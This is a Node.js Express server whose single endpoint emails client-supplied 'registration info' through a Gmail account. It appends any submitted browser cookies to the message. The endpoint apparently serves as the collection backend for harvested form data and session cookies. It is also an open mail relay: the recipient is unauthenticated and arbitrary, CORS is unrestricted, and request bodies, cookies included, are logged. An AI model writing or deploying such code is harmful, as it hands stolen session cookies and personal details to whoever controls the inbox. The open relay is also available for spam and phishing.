
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const path = require('path');

// Configure email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

const app = express();
const port = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the frontend build (dist) in production
// Enable CORS for the frontend
app.use(cors({
  origin: process.env.NODE_ENV === 'production' 
    ? process.env.FRONTEND_URL 
    : 'http://localhost:5173',
  credentials: true
}));

// POST /api/send-email - send registration info to email
app.post('/api/send-email', async (req, res) => {
  try {
    console.log('Received request:', req.body);
    const { to, subject, text, html, cookies } = req.body;
    
    if (!to || !subject) {
      console.error('Missing required fields');
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Log email configuration (but mask the password)
    console.log('Email configuration:', {
      user: process.env.EMAIL_USER,
      to: to,
      configured: !!process.env.EMAIL_PASS
    });

    // Verify connection configuration
    try {
      await transporter.verify();
      console.log('SMTP connection verified');
    } catch (error) {
      console.error('SMTP Verification failed:', error);
      return res.status(500).json({ error: 'Email server connection failed' });
    }
    // Add cookies to the email body if present
    let htmlWithCookies = html;
    if (cookies) {
      htmlWithCookies += `<h3>Cookies</h3><div style="background:#f5f5f5;padding:10px;border-radius:4px;">${Array.isArray(cookies) ? cookies.map(c => `<p>${c}</p>`).join('') : cookies}</div>`;
    }
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to,
      subject,
      text,
      html: htmlWithCookies,
    };
    await transporter.sendMail(mailOptions);
    res.json({ success: true, message: 'Email sent successfully.' });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ success: false, message: 'Failed to send email.' });
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});